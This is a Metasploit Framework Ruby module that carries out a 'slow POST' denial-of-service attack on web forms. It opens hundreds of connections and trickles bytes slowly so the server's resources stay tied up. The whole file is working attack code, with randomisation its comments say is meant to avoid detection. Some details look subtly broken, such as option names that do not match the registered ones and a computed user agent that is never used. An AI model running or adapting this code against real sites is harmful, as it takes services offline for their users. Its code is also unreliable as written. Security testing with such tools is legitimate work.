##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'thread'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'OWASP HTTP POST Strawman DoS',
			'Description'    => %q{
				This module performs a DoS attack on a web application using the HTTP POST technique
				presented by Wong Onn Chee and Tom Brennen at OWASP AppSec DC 2010.
				
				The strawman technique is a layer 7 based attack that utilizes a weakness in the POST protocol that
				allows an attacker to slow down the POST process to occupy resources. For example,
				by specifying a large Content-Length in the HTTP header of a request and then only
				sending one byte every long interval (e.g. 10 seconds) the attacker can occupy resources
				on the target machine.
				
				This module requires the use of a form to POST to on the target website. A fairly low bar
				for most websites.
				
				There is currently no patch for Apache or IIS though there are mitigation techniques
				for Apache and at the application layer.
			},
			'Author'         =>
				[
					'Wong Onn Chee',  # original research
					'Tom Brennen',	  # research
					'willis'	  # msf port
				],
			'Version'        => '$Revision$',
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'www.owasp.org/images/4/43/Layer_7_DDOS.pdf' ]
				],
			'DisclosureDate' => 'Sep 1 2009'))

		register_options([
			Opt::RPORT(80),
			Opt::RHOST(),
			OptString.new('URI', [ true, 'Form Location', '/search.aspx' ]),
			OptString.new('POST', [ true, 'Required POST String', 'search_string=waffles' ])	
		])
		
		register_advanced_options(
			[
				OptInt.new('Connections', [ true, 'Number of concurrent connections to make', 500 ]),
				OptString.new('Referrer', [ true, 'Referrer', "http://www.google.com" ]),
				OptString.new('UserAgent', [ false, 'User Agent to use', nil]),
				OptInt.new('ContentLength', [ true, 'Content Length to use', 10000 ]),
				OptBool.new('RandomUA', [false, 'Randomize User Agent in each connection', false])
				
			], self.class)

	end

	def random_user_agent
		[
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1),Opera/9.00 (Windows NT 5.1; U; en)",
			"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/522.11 (KHTML, like Gecko) Safari/3.0.2"
		].choice
	end

	def run

		uri = datastore['URI']
		user_agent = datastore['User Agent']
		referrer = datastore['Referrer']
		content_length = datastore['Content-Length']

		threads = []
		
		# let's generate random header data once to save cycles
		header1 = Rex::Text.rand_text_alphanumeric(8)
		header2 = Rex::Text.rand_text_alphanumeric(8)
				
		print_status("Spawning #{datastore['connections']} connections to #{rhost}:#{rport} with content length #{content_length}...")
		(1..Integer(datastore['connections'])).each do |i|
			threads << framework.threads.spawn("Module(#{self.refname})-#{rhost}", true) { |attack|

				rand_agent = datastore['UserAgent'] || random_user_agent

				http_headers = "POST " + uri + " HTTP/1.1\r\n"
				http_headers <<	"Pragma: no-cache\r\n"
				http_headers <<	"Proxy-Connection: Keep-Alive\r\n"
				http_headers <<	"Host: " + rhost + "\r\n"
				http_headers <<	"User-Agent: " + user_agent + "\r\n"
				http_headers <<	"Keep-Alive: 900\r\n"
				http_headers <<	"Proxy-Connection: keep-alive\r\n"
				http_headers <<	"Referer:" + referrer + "\r\n"
				http_headers <<	"Transfer-Encoding: chunked\r\n"
				http_headers <<	"Content-Type: application/x-www-form-urlencoded \r\n"
				http_headers <<	"X-" + header1 + ":" + header2 + "\r\n"
				http_headers <<	"Content-Length: #{content_length}\r\n\r\n"

				connect
				sock.put(http_headers)

				size = 0
				random_post_data = Rex::Text.rand_text_alphanumeric(content_length-datastore['POST'].size)
				post_data = datastore['POST'] + random_post_data

				while(content_length > 0)
					rand_length = rand(10)+1
					#send a random number of characters each time to again avoid detection
					sock.put(post_data[size..(size+rand_length)])

					#decide if we still have data to send
					content_length = content_length - rand_length

					#wait before sending more data
					sleep(rand(10))
				end
				sock.put("\r\n")	
				disconnect
			}
		end	
		threads.each { |aThread|  aThread.join }
		print_status("Closing all connections..")	
	end

end

